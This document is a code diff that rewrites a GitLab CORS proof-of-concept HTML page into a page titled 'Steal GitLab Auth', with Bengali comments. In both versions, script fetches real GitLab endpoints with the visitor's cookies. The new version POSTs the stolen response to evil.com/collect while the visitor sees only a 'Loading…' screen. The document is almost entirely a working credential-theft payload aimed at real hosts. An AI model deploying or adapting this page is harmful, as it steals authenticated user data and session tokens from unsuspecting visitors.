@@ -1,40 +1,34 @@
-<!-- cors-poc.html -->
 <!DOCTYPE html>
 <html>
+<head>
+  <title>Steal GitLab Auth</title>
+</head>
 <body>
-<h1>GitLab CORS PoC</h1>
-<script>
-// 1. Target URL
-const url = 'https://alerts.gitlab.net/api/v4/user';
-
-// 2. Send request
-fetch(url, {
-  credentials: 'include',
-  headers: { 
-    'Origin': window.location.origin 
-  }
-})
-.then(response => {
-  // 3. Log headers
-  console.log("Status:", response.status);
-  console.log("Headers:");
-  for (const [key, value] of response.headers.entries()) {
-    console.log(`${key}: ${value}`);
-  }
-  
-  // 4. Process response
-  return response.text();
-})
-.then(data => {
-  console.log("Response Data:", data);
-  document.getElementById("result").innerText = 
-    "Leaked Data: " + data.substring(0, 100) + "...";
-})
-.catch(error => {
-  console.error("Error:", error);
-  document.getElementById("result").innerText = "Error: " + error.message;
-});
-</script>
-<div id="result" style="white-space: pre-wrap;font-family: monospace;"></div>
+  <h1>Loading…</h1>
+  <script>
+    // অটোমেটেড GET রিকোয়েস্ট
+    fetch(
+      "https://projects.gitlab.io/auth?domain=https://docs.gitlab.com&state=iKOkN_x-pvhbvNdNe3Ra1g==",
+      {
+        method: "GET",
+        credentials: "include"  // কুকি/ক্রস-সাইট সেশন পাঠাবে
+      }
+    )
+    .then(res => res.text())
+    .then(text => {
+      // চুরির পর ফলাফল own সার্ভারে POST
+      return fetch("https://evil.com/collect", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ data: text })
+      });
+    })
+    .then(() => {
+      document.body.innerHTML = "<h1>Done!</h1>";
+    })
+    .catch(err => {
+      document.body.innerHTML = "<h1>Error:</h1><pre>" + err + "</pre>";
+    });
+  </script>
 </body>
 </html>
